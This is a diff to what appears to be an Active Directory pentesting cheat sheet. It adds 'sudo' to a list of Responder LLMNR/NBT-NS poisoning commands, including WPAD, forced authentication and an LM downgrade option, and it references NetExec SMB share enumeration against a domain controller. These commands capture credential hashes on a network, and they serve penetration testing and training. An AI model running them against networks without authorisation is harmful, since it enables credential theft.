@@ -392,37 +392,37 @@ NetExec smb <Domain_Controller_IP> -u 'a' -p '' --shares
   
   ### Kickstart responder
   ```shell
-  responder -I eth0
+  sudo responder -I eth0
   ```
 
   ### DHCP
   ```shell
-  responder -I eth0 -d
+  sudo responder -I eth0 -d
   ```
 
   ### DHCP-DNS
   ```shell
-  responder -I eth0 -D
+  sudo responder -I eth0 -D
   ```
 
   ### wpad
   ```shell
-  responder -I eth0 -w
+  sudo responder -I eth0 -w
   ```
 
   ### Froce wpad auth
   ```shell
-  responder -I eth0 -F
+  sudo responder -I eth0 -F
   ```
 
   ### Downdgrading
   ```shell
-  responder -I eth0 --lm --disable-ess
+  sudo responder -I eth0 --lm --disable-ess
   ```
 
   ### Full blast
   ```shell
-  responder -I eth0 -DwF
+  sudo responder -I eth0 -DwF
   ```
   
  </details>
@@ -482,7 +482,7 @@ NetExec smb <Domain_Controller_IP> -u 'a' -p '' --shares
 
 ### Kicksart responder then
   ```shell
-  sudo responder -I eth0 -dwv
+  sudo responder -I eth0 
   ```
 </details>
 
